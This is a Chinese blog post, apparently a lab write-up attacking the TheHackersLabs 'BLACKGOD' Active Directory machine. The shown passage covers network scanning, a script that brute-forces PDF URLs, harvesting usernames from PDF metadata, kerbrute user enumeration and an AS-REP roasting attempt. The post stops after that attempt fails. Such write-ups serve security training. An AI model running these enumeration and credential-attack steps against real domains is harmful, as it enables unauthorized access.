@@ -1,0 +1,482 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>thehackerslabs-BLACKGOD | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="好久没打windows了，找找手感 root@kali2 [~] ➜  arp-scan -l                                                                        [11:07:10] Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thehackerslabs-BLACKGOD">
+<meta property="og:url" content="https://tao0845.github.io/posts/92742d47/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="好久没打windows了，找找手感 root@kali2 [~] ➜  arp-scan -l                                                                        [11:07:10] Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.5">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/03/27/OS99qD.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/03/27/OS92Q6.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/03/27/OS92Q6.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/03/27/OS9CkB.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/03/27/OSja5a.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/03/27/OSjoAS.png">
+<meta property="article:published_time" content="2025-03-26T08:42:39.694Z">
+<meta property="article:modified_time" content="2025-03-27T06:01:00.156Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="AD">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ooo.0x0.ooo/2025/03/27/OS99qD.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">122</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">1</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.</span> <span class="toc-text">信息收集+用户枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rpc%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-smb"><span class="toc-number">3.</span> <span class="toc-text">rpc信息收集+smb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#genericWrite"><span class="toc-number">4.</span> <span class="toc-text">genericWrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="toc-number">5.</span> <span class="toc-text">卷影拷贝</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/92742d47/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">thehackerslabs-BLACKGOD</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-03-26 16:42:39" itemprop="dateCreated datePublished" datetime="2025-03-26T16:42:39+08:00">2025-03-26</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-03-27 14:01:00" itemprop="dateModified" datetime="2025-03-27T14:01:00+08:00">2025-03-27</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">2.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">15m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/thehackerlabs/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">thehackerlabs</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/AD/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">AD</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>好久没打windows了，找找手感</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                                                        <span class="token punctuation">[</span><span class="token number">11</span>:07:10<span class="token punctuation">]</span>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.1    0a:00:27:00:00:45       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.1    08:00:27:7f:42:4d       PCS Systemtechnik GmbH <span class="token punctuation">(</span>DUP: <span class="token number">2</span><span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.10   08:00:27:23:ab:68       PCS Systemtechnik GmbH</code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.56.10                                       <span class="token punctuation">[</span><span class="token number">11</span>:07:48<span class="token punctuation">]</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-27 <span class="token number">11</span>:07 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.10
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00019s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65515</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT      STATE SERVICE
+<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http
+<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn
+<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds
+<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5
+<span class="token number">593</span>/tcp   <span class="token function">open</span>  http-rpc-epmap
+<span class="token number">636</span>/tcp   <span class="token function">open</span>  ldapssl
+<span class="token number">3268</span>/tcp  <span class="token function">open</span>  globalcatLDAP
+<span class="token number">3269</span>/tcp  <span class="token function">open</span>  globalcatLDAPssl
+<span class="token number">5985</span>/tcp  <span class="token function">open</span>  wsman
+<span class="token number">9389</span>/tcp  <span class="token function">open</span>  adws
+<span class="token number">49664</span>/tcp <span class="token function">open</span>  unknown
+<span class="token number">49668</span>/tcp <span class="token function">open</span>  unknown
+<span class="token number">52407</span>/tcp <span class="token function">open</span>  unknown
+<span class="token number">52408</span>/tcp <span class="token function">open</span>  unknown
+<span class="token number">52418</span>/tcp <span class="token function">open</span>  unknown
+<span class="token number">52427</span>/tcp <span class="token function">open</span>  unknown</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.56.10 <span class="token parameter variable">-p</span> <span class="token number">53,80</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,52407,52408,52418,52427
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-27 <span class="token number">11</span>:12 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.10
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00021s latency<span class="token punctuation">)</span>.
+
+PORT      STATE SERVICE       VERSION
+<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token operator">|</span>_http-title:  Neptune 
+<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2025</span>-03-27 03:11:43Z<span class="token punctuation">)</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
+<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: neptune.thl0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
+<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
+<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
+<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: neptune.thl0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
+<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="token operator">|</span>_http-title: Not Found
+<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
+<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">52407</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">52408</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">52418</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">52427</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+MAC Address: 08:00:27:23:AB:68 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
+Device type: general purpose
+Running <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Microsoft Windows <span class="token number">2022</span><span class="token operator">|</span><span class="token number">11</span><span class="token operator">|</span><span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>
+OS CPE: cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server <span class="token number">2022</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">11</span> 21H2 <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>
+No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.
+Network Distance: <span class="token number">1</span> hop
+Service Info: Host: DC01<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+<span class="token operator">|</span> smb2-time: 
+<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-27T03:12:27
+<span class="token operator">|</span>_  start_date: N/A
+<span class="token operator">|</span>_nbstat: NetBIOS name: DC01, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:23:ab:68 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+<span class="token operator">|</span> smb2-security-mode: 
+<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
+<span class="token operator">|</span>_    Message signing enabled and required
+<span class="token operator">|</span>_clock-skew: <span class="token parameter variable">-59s</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="token number">1</span>   <span class="token number">0.21</span> ms <span class="token number">192.168</span>.56.10
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">111.14</span> seconds</code></pre>
+<p>拿到域名<code>neptune.thl</code>和域控<code>DC01.neptune.thl</code>添加到hosts</p>
+<h2 id="信息收集-用户枚举"><a href="#信息收集-用户枚举" class="headerlink" title="信息收集+用户枚举"></a>信息收集+用户枚举</h2><p><img src="https://ooo.0x0.ooo/2025/03/27/OS99qD.png" alt="OS99qD.png" loading="lazy"><br>有些pdf</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;neptune.thl&#x2F;docs&#x2F;2024-02-15.pdf</code></pre>
+<p>可以尝试提取所有pdf然后拿到提取用户名</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  python3 <span class="token parameter variable">-c</span> <span class="token string">"from datetime import datetime, timedelta; start=datetime(2023,1,1); end=datetime(2025,3,27); [print<span class="token variable"><span class="token punctuation">((</span>start <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span>i<span class="token punctuation">))</span></span>.strftime('%Y-%m-%d')) for i in range((end-start).days + 1)]"</span> <span class="token operator">></span>  date.txt
+root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  <span class="token function">head</span> <span class="token parameter variable">-n5</span> date.txt                                                         
+<span class="token number">2023</span>-01-01
+<span class="token number">2023</span>-01-02
+<span class="token number">2023</span>-01-03
+<span class="token number">2023</span>-01-04
+<span class="token number">2023</span>-01-05</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> a.sh                                                                   
+<span class="token comment">#!/bin/bash</span>
+
+<span class="token assign-left variable">base_url</span><span class="token operator">=</span><span class="token string">"http://neptune.thl/docs/data.pdf"</span>
+
+<span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> keyword<span class="token punctuation">;</span> <span class="token keyword">do</span>
+    <span class="token assign-left variable">download_url</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$&#123;base_url<span class="token operator">/</span>data<span class="token operator">/</span>$keyword&#125;</span>"</span>
+    <span class="token function">wget</span> <span class="token parameter variable">--spider</span> <span class="token string">"<span class="token variable">$download_url</span>"</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null  <span class="token comment"># 检查URL是否存在</span>
+    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+        <span class="token function">wget</span> <span class="token parameter variable">-O</span> <span class="token string">"<span class="token variable">$&#123;keyword&#125;</span>.pdf"</span> <span class="token string">"<span class="token variable">$download_url</span>"</span>
+        <span class="token builtin class-name">echo</span> <span class="token string">"Downloaded: <span class="token variable">$download_url</span>"</span>
+    <span class="token keyword">else</span>
+        <span class="token builtin class-name">echo</span> <span class="token string">"404 Not Found: <span class="token variable">$download_url</span> (skipped)"</span>
+    <span class="token keyword">fi</span>
+<span class="token keyword">done</span> <span class="token operator">&lt;</span> date.txt</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  <span class="token function">ls</span> <span class="token parameter variable">-al</span>                                                                   
+总计 <span class="token number">9608</span>
+drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">3880</span>  <span class="token number">3</span>月27日 <span class="token number">12</span>:17 <span class="token builtin class-name">.</span>
+drwxrwxrwt <span class="token number">21</span> root root   <span class="token number">460</span>  <span class="token number">3</span>月27日 <span class="token number">12</span>:09 <span class="token punctuation">..</span>
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">51219</span>  <span class="token number">2</span>月27日 <span class="token number">23</span>:10 <span class="token number">2023</span>-01-01.pdf
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">49380</span>  <span class="token number">2</span>月27日 <span class="token number">23</span>:10 <span class="token number">2023</span>-01-03.pdf
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">49912</span>  <span class="token number">2</span>月27日 <span class="token number">23</span>:10 <span class="token number">2023</span>-01-05.pdf
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">51672</span>  <span class="token number">2</span>月27日 <span class="token number">23</span>:10 <span class="token number">2023</span>-01-07.pdf
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">47096</span>  <span class="token number">2</span>月27日 <span class="token number">23</span>:10 <span class="token number">2023</span>-01-09.pdf
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">49593</span>  <span class="token number">2</span>月27日 <span class="token number">23</span>:10 <span class="token number">2023</span>-01-11.pdf
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">50383</span>  <span class="token number">2</span>月27日 <span class="token number">23</span>:11 <span class="token number">2023</span>-01-12.pdf</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  exiftool <span class="token parameter variable">-Creator</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-s</span> *.pdf <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'pdf$'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span>  <span class="token operator">></span> users.txt</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  <span class="token function">head</span> <span class="token parameter variable">-n5</span> users.txt                                                     
+Elizabeth.Brown
+Elizabeth.Davis
+Elizabeth.Garcia
+Elizabeth.Johnson
+Elizabeth.Jones</code></pre>
+<p>尝试枚举用户名</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  /root/Desktop/windows/kerbrute_linux_amd64 userenum <span class="token parameter variable">--dc</span> <span class="token number">192.168</span>.56.10  <span class="token parameter variable">-d</span> neptune.thl  users.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="token punctuation">\</span>/ ___/ __ <span class="token punctuation">\</span>/ ___/ / / / __/ _ <span class="token punctuation">\</span>
+ / ,<span class="token operator">&lt;</span> /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/_/  /_.___/_/   <span class="token punctuation">\</span>__,_/<span class="token punctuation">\</span>__/<span class="token punctuation">\</span>___/                                        
+
+Version: v1.0.3 <span class="token punctuation">(</span>9dad6e1<span class="token punctuation">)</span> - 03/27/25 - Ronnie Flathers @ropnop
+
+<span class="token number">2025</span>/03/27 <span class="token number">12</span>:02:30 <span class="token operator">></span>  Using KDC<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:
+<span class="token number">2025</span>/03/27 <span class="token number">12</span>:02:30 <span class="token operator">></span>   <span class="token number">192.168</span>.56.10:88
+
+<span class="token number">2025</span>/03/27 <span class="token number">12</span>:02:30 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       Lucas.Miller@neptune.thl
+<span class="token number">2025</span>/03/27 <span class="token number">12</span>:02:30 <span class="token operator">></span>  Done<span class="token operator">!</span> Tested <span class="token number">62</span> usernames <span class="token punctuation">(</span><span class="token number">1</span> valid<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token number">0.030</span> seconds</code></pre>
+<p>拿到一个用户<code>Lucas.Miller</code>，查看是否没开启预认证</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  GetNPUsers.py  -dc-ip <span class="token number">192.168</span>.56.10  neptune.thl/Lucas.Miller -no-pass     <span class="token punctuation">[</span><span class="token number">12</span>:13:15<span class="token punctuation">]</span>
+Impacket v0.9.24 - Copyright <span class="token number">2021</span> SecureAuth Corporation
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Getting TGT <span class="token keyword">for</span> Lucas.Miller
+/usr/local/bin/GetNPUsers.py:150: DeprecationWarning: datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> is deprecated and scheduled <span class="token keyword">for</span> <span class="token for-or-select variable">removal</span> <span class="token keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="token keyword">in</span> UTC: datetime.datetime.now<span class="token punctuation">(</span>datetime.UTC<span class="token punctuation">)</span>.
+  now <span class="token operator">=</span> datetime.datetime.utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> + datetime.timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User Lucas.Miller doesn't have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span></code></pre>
+<p>并没有开启,查看pdf</p>
